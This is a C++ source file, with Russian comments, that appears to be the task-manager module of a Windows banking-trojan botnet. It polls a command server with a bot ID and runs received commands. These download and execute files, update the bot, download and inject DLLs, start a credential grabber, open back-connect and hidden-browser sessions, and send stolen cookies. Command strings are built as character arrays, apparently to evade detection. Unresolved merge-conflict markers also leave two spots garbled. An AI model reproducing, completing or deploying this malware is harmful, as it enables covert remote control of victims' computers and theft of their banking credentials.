//---------------------------------------------------------------------------
#include <windows.h>

#include "Task.h"
#include "Memory.h"
#include "Strings.h"
#include "Loader.h"
#include "BotUtils.h"
#include "GetApi.h"
#include "BotClasses.h"
#include "BotConfig.h"
#include "Config.h"
#include "Utils.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "Grabber.h"
#include "Modules.h"

//---------------------------------------------------------------------------

typedef struct TTaskManager
{
	PCHAR URL;                  // Адрес откуда будут браться команды
	DWORD Interval;             // Интервал получения команд (ьиллисекунд);
	LPCRITICAL_SECTION Lock;    // Секция блокирования
	PList RegisteredCommands;   // Список зарегистрированных команд
	HANDLE CommandsThread;      // Поток отложенного выполнения команд
	HANDLE CommandEvent;        // Собитие добавления новой команды в список
	PList CommandsList;         // Список команд ожидающий выполнения
	bool Terminated;            // Признак прерванной работы

} *PTASKMANAGER;


typedef struct TRegisteredCommand
{
   PCHAR Name;
   TCommandMethod Method;
} *PRegisteredCommand;

typedef struct TCommand
{
	PCHAR Command;
    PCHAR Args;
} *PCommand;


// Глобальный енеджер задач
//HANDLE GLManagerPID = NULL;
PTaskManager GlobalTaskManager = NULL;

//---------------------------------------------------------------------------
PTaskManager GetGlobalTaskManager()
{
    // Возвращаем указатель на глобальный менеджер задач
	return GlobalTaskManager;
}

//---------------------------------------------------------------------------

void FreeCommand(LPVOID C)
{
	StrFree(PCommand(C)->Command);
	StrFree(PCommand(C)->Args);
    FreeStruct(C);
}
//----------------------------------------------------------------------------

void FreeRegisteredCommand(LPVOID C)
{
	StrFree(PRegisteredCommand(C)->Name);
    FreeStruct(C);
}
//----------------------------------------------------------------------------


bool InitializeTaskManager(PTaskManager *Manager)
{
	// Создать менеджер команд
	PTASKMANAGER M = CreateStruct(TTaskManager);
	if (M == NULL)
		return false;

	M->Lock = CreateStruct(RTL_CRITICAL_SECTION);
	pInitializeCriticalSection(M->Lock);


	if (Manager != NULL)
		*Manager = (PTaskManager)M;
	else
		GlobalTaskManager = M;

	return true;

}
//----------------------------------------------------------------------------

void FreeTaskManager(PTaskManager Manager)
{
	// Уничтожаем менеджер задач
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
	{
		M = (PTASKMANAGER)GlobalTaskManager;
		GlobalTaskManager = NULL;
	}

	if (M == NULL) return;


    StopTaskManager(Manager);
	pDeleteCriticalSection(M->Lock);
	FreeStruct(M->Lock);
    FreeStruct(M);
}

//----------------------------------------------------------------------------
PRegisteredCommand GetRegisteredCommand(PTASKMANAGER M, PCHAR CommandName)
{
	// Ищем команду по имени
    PRegisteredCommand C;
	DWORD Count = List::Count(M->RegisteredCommands);
	for (DWORD i = 0; i < Count; i++)
	{		
		C = (PRegisteredCommand)List::GetItem(M->RegisteredCommands, i);
		if (StrSame(C->Name, CommandName, false))
			return C;
	}

	return NULL;
}

//----------------------------------------------------------------------------
bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Method)
{
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GlobalTaskManager;

	if (M == NULL || StrIsEmpty(CommandName) || Method == NULL ||
		GetRegisteredCommand(M, CommandName) != NULL)
		return false;


	// Создаём описание команды
	pEnterCriticalSection(M->Lock);

	if (M->RegisteredCommands == NULL)
	{
		M->RegisteredCommands = List::Create();
		List::SetFreeItemMehod(M->RegisteredCommands, FreeRegisteredCommand);
    }

	PRegisteredCommand C = CreateStruct(TRegisteredCommand);
	if (C != NULL)
	{
		C->Name = StrNew(CommandName);
		C->Method = Method;
    }
    List::Add(M->RegisteredCommands, C);

	pLeaveCriticalSection(M->Lock);

	return C != NULL;
}
//----------------------------------------------------------------------------

DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
{
	// Процедура потока выполнения комманд
	PTASKMANAGER M = (PTASKMANAGER)Data;
	PCommand Command;
	do
	{
		// Ожидаем события
		pWaitForSingleObject(M->CommandEvent, INFINITE);

		if (!M->Terminated)
		{
            // Получаем следующую команду
			pEnterCriticalSection(M->Lock);

			Command = (PCommand)List::Extract(M->CommandsList, 0);
			// В случае если список пустой сбрасываем событие
			if (List::Count(M->CommandsList) == 0)
				pResetEvent(M->CommandEvent);

			pLeaveCriticalSection(M->Lock);

			// Выполняем команду
			ExecuteCommand(NULL, Command->Command, Command->Args, false);

			FreeCommand(Command);
        }
	}
	while (!M->Terminated);
	pExitThread(0);
    return 0;
}

//----------------------------------------------------------------------------

void CreateTaskThread(PTASKMANAGER M)
{
	// Создать необходимые данные для отложенного выполнения команд
	if (M->CommandsThread != NULL)
		return;
	M->CommandsList = List::Create();
	List::SetFreeItemMehod(M->CommandsList, FreeCommand);
	M->CommandEvent = pCreateEventA(NULL, true, false, NULL);
	M->CommandsThread = pCreateThread(NULL, 512, ExecuteCommandsProc, M, 0, NULL);
}
//----------------------------------------------------------------------------
bool TaskManagerSleep(PTaskManager Manager)
{
	// Заснуть на необходимыи интервал
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GlobalTaskManager;
	if (M == NULL || M->Terminated)
		return false;

	// Определяем интервал
	DWORD Interval = M->Interval;

	if (Interval == 0)
		Interval = GetDelay() * 60 * 1000;

	if (Interval == 0)
		Interval = 60*1000;

	// Спим
	DWORD SleepTime = 0;
	while (SleepTime < Interval && !M->Terminated)
	{
		pSleep(1000);
        SleepTime += 1000;
	}

    return !M->Terminated;
}

//----------------------------------------------------------------------------

bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitManager, bool InitCommands)
{
	/*   Запускаем цикл обработки команд  */

	// Инициализируем менеджер выполнения команд
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
	{
		// Инициализируем глобальный менеджер
		if (InitManager)
			if (!InitializeTaskManager(NULL))
				return false;
		M = (PTASKMANAGER)GlobalTaskManager;
	}

	// Регистрируем известные команды
	if (InitCommands)
		RegisterAllCommands(M, COMMAND_ALL);

	PCHAR RealURL = URL;
	bool SelfURL = URL == NULL;
	
	// Запускаем цикл обработки
	do
	{
		if (SelfURL)
			RealURL = GetBotScriptURL(ScriptTask);

		// Загружаем и выполняем команду
		if (RealURL != NULL)
			DownloadAndExecuteCommand(M, RealURL);

		if (SelfURL)
			StrFree(RealURL);
		// Спим до выполнения следующей команды
		if (!M->Terminated)
	        TaskManagerSleep(M);


	}
	while (!M->Terminated);
	return true;
}

//----------------------------------------------------------------------------

void StopTaskManager(PTaskManager Manager)
{
	// Прервать работу менеджера задач
	if (Manager == NULL)
        Manager = GlobalTaskManager;

	PTASKMANAGER M = (PTASKMANAGER)Manager;
	pEnterCriticalSection(M->Lock);

	if (M->CommandsThread)
	{
		// Поток работает, останавливаеь
		M->Terminated = true;
		pSetEvent(M->CommandEvent);
		pWaitForSingleObject(M->CommandsThread, 1000);

		pCloseHandle(M->CommandEvent);
		pCloseHandle(M->CommandsThread);
		List::Free(M->CommandsList);

		M->CommandEvent = NULL;
		M->CommandsThread = NULL;
		M->CommandsList = NULL;
	}

	pLeaveCriticalSection(M->Lock);
}
//----------------------------------------------------------------------------

bool DownloadCommand(PCHAR URL,PCHAR *HTMLCode)
{
	// Загрузить команду
	if (URL == NULL)
		return false;
	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "id", BotID);

    StrFree(BotID);

<<<<<<< .mine
	bool Result =   HTTP::Post(URL, Fields, HTMLCode);
=======
	bool Result = HTTP::Post(URL, Fields, HTMLCode);
>>>>>>> .r109

	Strings::Free(Fields);
    return Result;
}
//----------------------------------------------------------------------------

bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
{
	// Загрузить и выполнить команду
	if (URL == NULL)
		return false;

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GlobalTaskManager;
	if (M == NULL)
		return false;

	// Загружаем команду
    PCHAR Command = NULL;
	bool Result = false;

	if (DownloadCommand(URL, &Command))
	{
		Result = ExecuteCommand(M, Command);
        StrFree(Command);
	}

    return Result;
}
//----------------------------------------------------------------------------

void DoAfterExecuteCommand(PTASKMANAGER Manager, PCHAR Command, PCHAR Args, bool Executed)
{
	// событие уведомления об исполнении команды
 	PCHAR  prefix;
	if (Executed)
		prefix = "выполнено";
	else
		prefix = "не выполнено";

    DbgMsg("task", 0, "%s %s ( %s )", prefix, Command, Args);
}
//---------------------------------------------------------------------------



bool InvalidChar(char c)
{
	return c == 10 ||
		   c == 13 ||
		   c == 9 ||
		   c == 32;
}

bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
{
	// Рапарсивает HTML строку на команду и аргументы
	if (HTML == NULL)
		return false;

	Args = STR::GetRightStr(HTML, " ");

	if (Args != NULL)
	{
		Command = STR::GetLeftStr(HTML, " ");
		bool Changed = false;
		// Обрезаем лишние символы
		DWORD Len = StrLength(Args);
		PCHAR Tmp = Args + (Len - 1);
		while (Tmp != Args && InvalidChar(*Tmp))
		{
            *Tmp = 0;
			Tmp--;
			Changed = true;
		}
		if (Changed)
		{
			Tmp = Args;
			Args = StrNew(Tmp);
			StrFree(Tmp);
		}
	}
	else
		Command = StrNew(HTML);
    return Command != NULL;
}
//---------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
{	
	// Раcпарсить HTML и выполнить команду
	if (StrIsEmpty(HTML))
		return false;

	PStrings S = Strings::Create();
	Strings::SetText(S, HTML);
	DWORD Count = Strings::Count(S);

	bool Res = false;
	PCHAR Command = NULL;
	PCHAR Args = NULL;
    PCHAR Line = NULL;

	for (DWORD i = 0; i < Count; i++)
	{
		Line = Strings::GetItem(S, i, false);
		//
		//  команды начинающиеся с символа ; игнорируются
		//
		if (!StrIsEmpty(Line) && *Line != ';')
		{			
			ParseCommand(Line, Command, Args);

			if (!StrIsEmpty(Command))
				Res = Res | ExecuteCommand(Manager, Command, Args, Deferred);

			StrFree2(Command);
			StrFree2(Args);
        }
	}
	Strings::Free(S);

	return Res;
}

//---------------------------------------------------------------------------

bool ExecuteDeferredCommand(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Добавить команду в список отложенного выполнения менеджера задач
	PTASKMANAGER M =(PTASKMANAGER)Manager;
	if (M == NULL || Command == NULL)
		return false;

	pEnterCriticalSection(M->Lock);

	// Запускаем поток
	CreateTaskThread(M);

	// Создаём комаенду и добавляем её в список
	PCommand C = CreateStruct(TCommand);
	C->Command = StrNew(Command);
	C->Args = StrNew(Args);

	List::Add(M->CommandsList, C);
	pSetEvent(M->CommandEvent);

	//
	pLeaveCriticalSection(M->Lock);

	return true;
}
//----------------------------------------------------------------------------

TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
//----------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
{
	// Выполнить команду Command с аргументами Args
	// В случае если Deferred == true выполнение команды будет передано
	// В поток выполнения
	if (Command == NULL)
		return false;

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GlobalTaskManager;

	// Определяем метод команды
	TCommandMethod Method = GetCommandMethod(M, Command);
	if (Method == NULL)
		return false;

    // Добавляем команду в список отложенных команд
	if (Deferred && M != NULL)
	{
		// Отправляем на отложенное выполнение
		ExecuteDeferredCommand(M, Command, Args);
		return true;
    }

	// Выполняем команду
   	bool Result = Method(M, Command, Args);

	// Вызываем событие выполнения команды
	DoAfterExecuteCommand(M, Command, Args, Result);


	return Result;

}
//---------------------------------------------------------------------------


//--------------------------  Обработчики команд -------------------------//

bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Загрузить и выполнить файл

	if (Args == NULL)
		return false;

	PWCHAR FileName = GetTempName();

	if ( FileName)
	{
		ExecuteFile(Args, FileName);
		MemFree(FileName);
		return true;
	}

	return false;
}


bool ExecuteUpdateConfig(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Загрузить конфигурационный файл
	if (Args == NULL)
		return false;
	return Config::Download(Args);
}

bool ExecuteUpdate(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Загрузить обновление
	bool Result = false;
	WCHAR *FileName = GetTempName();

	if (FileName)
	{
		if (DownloadInFile(Args, FileName ) && (DWORD)pGetFileAttributesW( FileName ) != INVALID_FILE_ATTRIBUTES )
			Result = MakeUpdate(FileName );
	}

	MemFree( FileName );
	return Result;
}

bool ExecuteLoadDLL(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Команда на загрузку ьиьлиотеки
	WCHAR *FileName = GetTempName();

	if (FileName == NULL)
		return false;

	bool Result = false;
	if ( DownloadInFile(Args, FileName ) && FileExistsW(FileName))
		Result = InjectDll(FileName );

	MemFree(FileName);
	return Result;
}

bool ExecuteGrabber(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Запустить поток грабера
	return TwiceJumpSelf(GrabberThread);
}

bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Запустить множественную загрузку файлов
	return false;

  /*		char * cPointer= m_strstr(&Buffer[1],"http:");
		if (LoadExe==NULL)
		{

			LoadExe = (char*)MemAlloc(m_lstrlen(cPointer))+1+4;
			m_lstrncpy(LoadExe,"exe=",4);
			m_lstrcat( LoadExe, cPointer );
		}
		else
		{
			LoadExe=(char*)MemRealloc(LoadExe,m_lstrlen(cPointer)+m_lstrlen(LoadExe)+1);
			m_lstrcat( LoadExe, cPointer );
		}

		char* cUrl=Buffer;
		char* cUrlNext;
		int i;
		char *DownloadUrl;
		while (true)
		{
			cUrl= m_strstr(&cUrl[1],"http:");
			if (cUrl==NULL)break;
			cUrlNext= m_strstr(cUrl,"|");
			i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
			DownloadUrl = (char*)MemAlloc(i)+1;
			m_lstrncpy(DownloadUrl,cUrl,i);
			DownloadUrl[i]='\0';


			if ( DownloadUrl )
			{


				WCHAR *FileName =(WCHAR *)GetTempName();

				if ( FileName && DownloadUrl )
				{
					ExecuteFile( DownloadUrl, FileName );
				}

				MemFree( FileName );
			}

			MemFree( DownloadUrl );
		}
    */

}


bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// выполнить команду alert
	pMessageBoxA(0, Args, NULL, MB_OK | MB_ICONINFORMATION);
	return true;
}


//---------------------------------------------------------------------------


TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
{
    // Выполнить стандартную команду
	
	char CommandUpdate[]        = {'u','p','d','a','t','e',0};
	char CommandUpdateConfig[]  = {'u','p','d','a','t','e','c','o','n','f','i','g' ,0};
	char CommandDownload[]      = {'d','o','w','n','l','o','a','d',0};
	char CommandLoadDll[]       = {'l','o','a','d','d','l','l',0};
	char CommandGrabber[]       = {'g','r','a','b','b','e','r',0};
//	char CommandMultiDownload[] = {'m','u','l','t','i','d','o','w','n','l','o','a','d',0};
	char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};


	switch (StrIndexOf(Command, false, 6,
		CommandUpdate,
		CommandUpdateConfig,
		CommandDownload,
		CommandLoadDll,
		CommandGrabber,
//		CommandMultiDownload,
		CommandAlert))
	{
		case 0: return ExecuteUpdate;
		case 1: return ExecuteUpdateConfig;
		case 2: return ExecuteDownload;
		case 3: return ExecuteLoadDLL;
		case 4: return ExecuteGrabber;
<<<<<<< .mine
		case 5: return ExecuteMultiDownload;		
=======
//		case 5: return ExecuteMultiDownload;
		case 5: return ExecuteAlert;
>>>>>>> .r109

    default: ;
	}

	// Ищем команду в списке зарегистрированных
	if (Manager != NULL)
	{
		PRegisteredCommand Cmd = GetRegisteredCommand(Manager, Command);
		if (Cmd != NULL)
			return Cmd->Method;
	}

	return NULL;
}
//---------------------------------------------------------------------------




void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
{

	// Регистрируем известные команды бота

	//char CommandMultiDownload[] = {'m','u','l','t','i','d','o','w','n','l','o','a','d',0};

	#ifdef RuBnkH
		RegisterCommand(Manager, (PCHAR)Iblock_Url, ExecuteIblock_Url);
	#endif

	//-------------------------------------------------
	// Команда Back Connect
	#ifdef BackConnectH
        RegisterCommand(Manager, CommandBackConnect, ExecuteBackConnectCommand);
	#endif

	//-------------------------------------------------
	// Команда скрытого браузера
	#ifdef StealthBrowserH
		char CommandSB[] = {'s','b',0};  //sb 127.0.0.1 9999
		RegisterCommand(Manager, CommandSB, ExecuteSBCommand);
    #endif

	//-------------------------------------------------
	// Команды для раблоты с куками
	#ifdef coocksolH
		RegisterCommand(Manager, (PCHAR)CommandDeleteCookies, ExecuteDeleteCookiesCommand);
		RegisterCommand(Manager, (PCHAR)CommandSendCookies, ExecuteSendCookiesCommand);
	//	RegisterCommand(Manager, (PCHAR)CommandCookSol,ExecuteDellCookSol);
	#endif


}

